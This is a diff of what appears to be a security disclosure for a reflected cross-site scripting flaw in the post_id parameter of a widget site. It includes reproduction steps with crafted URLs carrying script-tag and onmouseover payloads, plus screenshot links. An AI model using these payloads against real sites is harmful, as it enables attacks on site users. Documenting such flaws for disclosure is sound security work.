@@ -13,7 +13,7 @@ A crafted value can break out of the existing attribute and inject executable HT
 
 1. Open the following crafted URL in a browser:
 
-   https://widgets.pwnedbox.site/?post_id=%22Priyanshxop%27%22%3C%3E%3Cscript%3Ealert(1)%3C/script%3E
+   [https://widgets.pwnedbox.site/?post_id=%22Priyanshxop%27%22%3C%3E%3Cscript%3Ealert(1)%3C/script%3E](https://widgets.pwnedbox.site/?post_id=t3_u9po1l%20onmouseover=alert(document.domain)%20y=%20Hover%20over%20this%20button%20to%20trigger%20the%20XSS.)
 
 2. Allow the page to load with the crafted `post_id` parameter.
 3. Observe the JavaScript alert displaying `1`.
@@ -30,7 +30,7 @@ Screenshot 1 – Crafted post_id payload in the URL and successful JavaScript al
 
 Screenshot 2 – Page source showing the injected payload inside the See More Comments button's id attribute.
 
-<img width="1918" height="960" alt="image" src="https://github.com/user-attachments/assets/499c65cc-9754-4249-bfef-c1bcad430ecb" />
+<img width="1912" height="972" alt="image" src="https://github.com/user-attachments/assets/85c88da2-60c4-4af3-8ad7-d1d3964ff316" />
 
 Screenshot 3 – Parameter discovery using x8scan, identifying post_id.
 
